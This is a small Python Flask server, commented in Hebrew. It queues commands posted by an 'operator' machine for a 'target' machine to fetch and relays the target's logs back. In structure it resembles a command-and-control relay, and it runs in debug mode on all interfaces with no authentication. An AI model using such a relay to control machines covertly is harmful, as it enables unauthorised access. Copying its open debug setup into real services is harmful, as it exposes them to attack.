from flask import Flask, request, jsonify
from threading import Lock
from flask import Flask
from flask_cors import CORS

# from flask_cors import CORS  # להוספת CORS אם הצד לקוח רץ בדומיין אחר

app = Flask(__name__)

# CORS(app)  # אפשר CORS עבור תקשורת בין דומיינים שונים

commands = []
logs = []
data_lock = Lock()


@app.route('/send_command', methods=['POST'])
def send_command():
    """מקבל פקודות ממחשב המפעיל ומאחסן אותן"""
    command_data = request.json
    with data_lock:
        commands.append(command_data)
    return jsonify({"status": "Command stored"})


@app.route('/get_commands', methods=['GET'])
def get_commands():
    """שולח את כל הפקודות למחשב היעד ומנקה את הרשימה"""
    with data_lock:
        pending_commands = commands.copy()
        commands.clear()
    return jsonify({"commands": pending_commands})


@app.route('/receive_logs', methods=['POST'])
def receive_logs():
    """מקבל לוגים ממחשב היעד ומאחסן אותם"""
    log_data = request.json
    with data_lock:
        logs.append(log_data)
    return jsonify({"status": "Log stored"})


@app.route('/get_logs', methods=['GET'])
def get_logs():
    """שולח את כל הלוגים למחשב המפעיל ומנקה את הרשימה"""
    with data_lock:
        pending_logs = logs.copy()
        logs.clear()
    return jsonify({"logs": pending_logs})


if __name__ == '__main__':
    CORS(app)
    app.run(host='0.0.0.0', port=5000, debug=True)
